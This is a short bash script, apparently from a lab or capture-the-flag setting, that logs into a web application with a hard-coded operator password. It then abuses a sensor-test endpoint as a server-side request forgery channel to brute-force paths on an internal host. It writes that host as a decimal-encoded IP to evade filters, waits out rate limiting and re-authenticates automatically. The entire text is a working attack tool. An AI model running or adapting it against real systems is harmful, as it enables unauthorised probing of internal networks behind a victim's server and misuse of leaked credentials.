#!/bin/bash
BASE="http://169.58.126.107:6002"
dec=2887319554
jar=$(mktemp)
/usr/bin/curl -s -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
count=0
while IFS= read -r word; do
  [ -z "$word" ] && continue
  count=$((count+1))
  res=$(/usr/bin/curl -s -m 5 -b "$jar" -X POST "$BASE/ops/test-sensor" --data-urlencode "url=http://$dec:4000/$word")
  while [[ "$res" == *"rate limited"* ]]; do
    echo "RATE LIMITED at word=$word (count=$count), backing off 600s"
    sleep 600
    res=$(/usr/bin/curl -s -m 5 -b "$jar" -X POST "$BASE/ops/test-sensor" --data-urlencode "url=http://$dec:4000/$word")
  done
  if [[ "$res" == *"Redirecting to /login"* ]] || [[ -z "$res" ]]; then
    echo "SESSION EXPIRED at word=$word, relogging in and retrying"
    /usr/bin/curl -s -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
    res=$(/usr/bin/curl -s -m 5 -b "$jar" -X POST "$BASE/ops/test-sensor" --data-urlencode "url=http://$dec:4000/$word")
  fi
  if [[ "$res" != *"Cannot GET"* ]] && [[ "$res" != *"Redirecting to /login"* ]]; then
    echo "HIT $word: $res"
  fi
  sleep 8
done < "$1"
echo "done, tested $count words"
rm -f "$jar"
